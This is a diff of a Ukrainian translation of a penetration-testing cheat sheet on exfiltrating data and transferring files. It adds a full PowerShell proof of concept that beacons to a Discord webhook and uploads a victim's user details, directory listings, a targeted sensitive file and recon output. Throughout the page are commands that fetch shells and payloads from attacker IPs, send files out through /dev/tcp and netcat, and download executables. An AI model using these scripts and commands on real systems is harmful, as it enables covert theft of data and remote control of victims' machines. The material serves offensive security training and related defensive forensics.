@@ -1,19 +1,19 @@
-# Екстракція
+# Exfiltration
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Загальновідомі домени, які дозволяють екстракцію інформації
+## Поширені whitelisted домени для exfiltrate інформації
 
-Перевірте [https://lots-project.com/](https://lots-project.com/), щоб знайти загальновідомі домени, які можна зловживати
+Перевірте [https://lots-project.com/](https://lots-project.com/), щоб знайти commonly whitelisted domains, якими можна зловживати
 
-## Копіювати\&Вставити Base64
+## Copy\&Paste Base64
 
 **Linux**
 ```bash
 base64 -w0 <file> #Encode file
 base64 -d file #Decode file
 ```
-**Вікна**
+**Windows**
 ```
 certutil -encode payload.dll payload.b64
 certutil -decode payload.b64 payload.dll
@@ -27,7 +27,7 @@ wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
 curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
 fetch 10.10.14.14:8000/shell.py #FreeBSD
 ```
-**Вікна**
+**Windows**
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
 bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf
@@ -46,7 +46,7 @@ Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 
 - [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
 - [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
-- Python модуль [uploadserver](https://pypi.org/project/uploadserver/):
+- Модуль Python [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
 python3 -m pip install --user uploadserver
@@ -59,7 +59,7 @@ curl -X POST http://HOST/upload -H -F 'files=@file.txt'
 # With basic auth:
 # curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
 ```
-### **HTTPS Сервер**
+### **HTTPS сервер**
 ```python
 # from https://gist.github.com/dergachev/7028596
 # taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
@@ -100,6 +100,91 @@ if __name__ == "__main__":
 app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ###
 ```
+## Webhooks (Discord/Slack/Teams) для C2 & Data Exfiltration
+
+Webhooks — це write-only HTTPS endpoints, які приймають JSON та необов'язкові частини файлів. Їх зазвичай дозволяють для trusted SaaS domains і вони не потребують OAuth/API keys, що робить їх корисними для low-friction beaconing та exfiltration.
+
+Ключові ідеї:
+- Endpoint: Discord використовує https://discord.com/api/webhooks/<id>/<token>
+- POST multipart/form-data з частиною під назвою payload_json, що містить {"content":"..."} та необов'язковою(-ими) частиною(ями) файлу під назвою file.
+- Operator loop pattern: periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK підтверджують доставку.
+
+PowerShell PoC (Discord):
+```powershell
+# 1) Configure webhook and optional target file
+$webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
+$target  = Join-Path $env:USERPROFILE "Documents\SENSITIVE_FILE.bin"
+
+# 2) Reuse a single HttpClient
+$client = [System.Net.Http.HttpClient]::new()
+
+function Send-DiscordText {
+param([string]$Text)
+$payload = @{ content = $Text } | ConvertTo-Json -Compress
+$jsonContent = New-Object System.Net.Http.StringContent($payload, [System.Text.Encoding]::UTF8, "application/json")
+$mp = New-Object System.Net.Http.MultipartFormDataContent
+$mp.Add($jsonContent, "payload_json")
+$resp = $client.PostAsync($webhook, $mp).Result
+Write-Host "[Discord] text -> $($resp.StatusCode)"
+}
+
+function Send-DiscordFile {
+param([string]$Path, [string]$Name)
+if (-not (Test-Path $Path)) { return }
+$bytes = [System.IO.File]::ReadAllBytes($Path)
+$fileContent = New-Object System.Net.Http.ByteArrayContent(,$bytes)
+$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
+$json = @{ content = ":package: file exfil: $Name" } | ConvertTo-Json -Compress
+$jsonContent = New-Object System.Net.Http.StringContent($json, [System.Text.Encoding]::UTF8, "application/json")
+$mp = New-Object System.Net.Http.MultipartFormDataContent
+$mp.Add($jsonContent, "payload_json")
+$mp.Add($fileContent, "file", $Name)
+$resp = $client.PostAsync($webhook, $mp).Result
+Write-Host "[Discord] file $Name -> $($resp.StatusCode)"
+}
+
+# 3) Beacon/recon/exfil loop
+$ctr = 0
+while ($true) {
+$ctr++
+# Beacon
+$beacon = "━━━━━━━━━━━━━━━━━━`n:satellite: Beacon`n```User: $env:USERNAME`nHost: $env:COMPUTERNAME```"
+Send-DiscordText -Text $beacon
+
+# Every 2nd: quick folder listing
+if ($ctr % 2 -eq 0) {
+$dirs = @("Documents","Desktop","Downloads","Pictures")
+$acc = foreach ($d in $dirs) {
+$p = Join-Path $env:USERPROFILE $d
+$items = Get-ChildItem -Path $p -ErrorAction SilentlyContinue | Select-Object -First 3 -ExpandProperty Name
+if ($items) { "`n$d:`n - " + ($items -join "`n - ") }
+}
+Send-DiscordText -Text (":file_folder: **User Dirs**`n━━━━━━━━━━━━━━━━━━`n```" + ($acc -join "") + "```")
+}
+
+# Every 3rd: targeted exfil
+if ($ctr % 3 -eq 0) { Send-DiscordFile -Path $target -Name ([IO.Path]::GetFileName($target)) }
+
+# Every 4th: basic recon
+if ($ctr % 4 -eq 0) {
+$who = whoami
+$ip  = ipconfig | Out-String
+$tmp = Join-Path $env:TEMP "recon.txt"
+"whoami:: $who`r`nIPConfig::`r`n$ip" | Out-File -FilePath $tmp -Encoding utf8
+Send-DiscordFile -Path $tmp -Name "recon.txt"
+}
+
+Start-Sleep -Seconds 20
+}
+```
+Примітки:
+- Схожі підходи застосовуються до інших платформ для спільної роботи (Slack/Teams), що використовують incoming webhooks; відкоригуйте URL і JSON схему відповідно.
+- Для DFIR артефактів кешу Discord Desktop та відновлення webhook/API див.:
+
+{{#ref}}
+../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
+{{#endref}}
+
 ## FTP
 
 ### FTP сервер (python)
@@ -107,12 +192,12 @@ app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
 ```
-### FTP сервер (NodeJS)
+### FTP server (NodeJS)
 ```
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
 ```
-### FTP сервер (pure-ftp)
+### FTP server (pure-ftp)
 ```bash
 apt-get update && apt-get install pure-ftp
 ```
@@ -130,7 +215,7 @@ mkdir -p /ftphome
 chown -R ftpuser:ftpgroup /ftphome/
 /etc/init.d/pure-ftpd restart
 ```
-### **Клієнт Windows**
+### **Windows** клієнт
 ```bash
 #Work well with python. With pure-ftp use fusr:ftp
 echo open 10.11.0.41 21 > ftp.txt
@@ -150,7 +235,7 @@ kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-Або створіть smb спільний доступ **використовуючи samba**:
+Або створіть smb-шару **за допомогою samba**:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -165,7 +250,7 @@ guest ok = Yes
 #Start samba
 service smbd restart
 ```
-Віндовс
+Windows
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -175,13 +260,13 @@ WindPS-2> cd new_disk:
 ```
 ## SCP
 
-Атакуючий повинен мати запущений SSHd.
+У зловмисника має бути запущений SSHd.
 ```bash
 scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-Якщо жертва має SSH, зловмисник може змонтувати каталог з жертви до зловмисника.
+Якщо у жертви є SSH, зловмисник може змонтувати каталог з системи жертви на систему зловмисника.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -194,7 +279,7 @@ nc -vn <IP> 4444 < exfil_file
 ```
 ## /dev/tcp
 
-### Завантажити файл з жертви
+### Завантажити файл з victim
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
@@ -206,7 +291,7 @@ nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 exec 6< /dev/tcp/10.10.10.10/4444
 cat <&6 > file.txt
 ```
-дякую **@BinaryShadow\_**
+дякуємо **@BinaryShadow\_**
 
 ## **ICMP**
 ```bash
@@ -228,33 +313,33 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-Якщо ви можете надсилати дані на SMTP сервер, ви можете створити SMTP для отримання даних за допомогою python:
+Якщо ви можете надсилати дані на SMTP server, ви можете створити SMTP для отримання даних за допомогою python:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-За замовчуванням у XP та 2003 (в інших його потрібно явно додати під час установки)
+За замовчуванням в XP і 2003 (в інших його потрібно явно додати під час встановлення)
 
-У Kali, **запустіть TFTP сервер**:
+У Kali, **start TFTP server**:
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
 atftpd --daemon --port 69 /tftp
 cp /path/tp/nc.exe /tftp
 ```
-**TFTP сервер на python:**
+**TFTP-сервер на python:**
 ```bash
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-У **жертві** підключіться до сервера Kali:
+У **victim**, підключіться до сервера Kali:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-Завантажте файл з PHP oneliner:
+Завантажити файл за допомогою PHP oneliner:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
@@ -296,18 +381,24 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Програма `debug.exe` не тільки дозволяє перевіряти бінарні файли, але також має **можливість відновлювати їх з шістнадцяткового коду**. Це означає, що, надаючи шістнадцятковий код бінарного файлу, `debug.exe` може згенерувати бінарний файл. Однак важливо зазначити, що debug.exe має **обмеження на складання файлів розміром до 64 кб**.
+Програма `debug.exe` не лише дозволяє оглядати бінарні файли, але й має **можливість відновлювати їх з hex**. Це означає, що, надавши hex бінарного файлу, `debug.exe` може згенерувати бінарний файл. Однак важливо зауважити, що debug.exe має **обмеження на збірку файлів розміром до 64 kb**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-Потім вставте текст у вікно командного рядка Windows, і буде створено файл з назвою nc.exe.
+Скопіюйте та вставте текст у windows-shell, і буде створено файл під назвою nc.exe.
 
 - [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
 ## DNS
 
 - [https://github.com/Stratiz/DNS-Exfil](https://github.com/Stratiz/DNS-Exfil)
+
+## Посилання
+
+- [Discord як C2 та кешовані докази, що залишилися позаду](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
+- [Discord Webhooks – Execute Webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
+- [Discord Forensic Suite (cache parser)](https://github.com/jwdfir/discord_cache_parser)
 
 {{#include ../banners/hacktricks-training.md}}
